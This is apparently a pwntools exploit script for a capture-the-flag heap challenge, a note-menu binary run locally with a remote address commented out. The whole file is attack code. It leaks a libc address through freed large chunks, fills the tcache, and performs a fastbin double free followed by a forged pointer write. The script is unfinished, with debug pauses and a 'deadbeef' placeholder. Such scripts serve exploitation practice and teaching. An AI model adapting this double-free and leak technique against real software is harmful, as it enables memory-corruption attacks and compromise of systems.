from pwn import *

r = process('./chal')
# r = remote('10.113.184.121', 10057)
context.arch = 'amd64'

def add_note(idx, len):
    r.recvuntil(b'choice: ')
    r.send(b'1')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Length: ')
    r.send(str(len).encode())

def read_note(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvline()
    return r.recvline()

def write_note(idx, content):
    r.recvuntil(b'choice: ')
    r.send(b'3')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Content: ')
    r.send(content)

def del_note(idx):
    r.recvuntil(b'choice: ')
    r.send(b'4')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

# Leak libc address
add_note(12, 0x420)
add_note(13, 0x420)
add_note(14, 0x420)
raw_input()
del_note(12)
del_note(13)
raw_input()
add_note(12, 0x420)
read_note(12)

raw_input()
for i in range(1, 0xa):
    add_note(i, 0x10)

for i in range(1, 0x8):
    del_note(i)


raw_input()
del_note(8)
del_note(9)
del_note(8)

# Clean tcache
for i in range(1, 0x8):
    add_note(i, 0x10)
add_note(8, 0x10)
write_note(8, b'c8763'.ljust(0x8, b'\x00') + b'deadbeef')
raw_input()
add_note(9, 0x10)
add_note(10, 0x10)
add_note(11, 0x10)
r.interactive()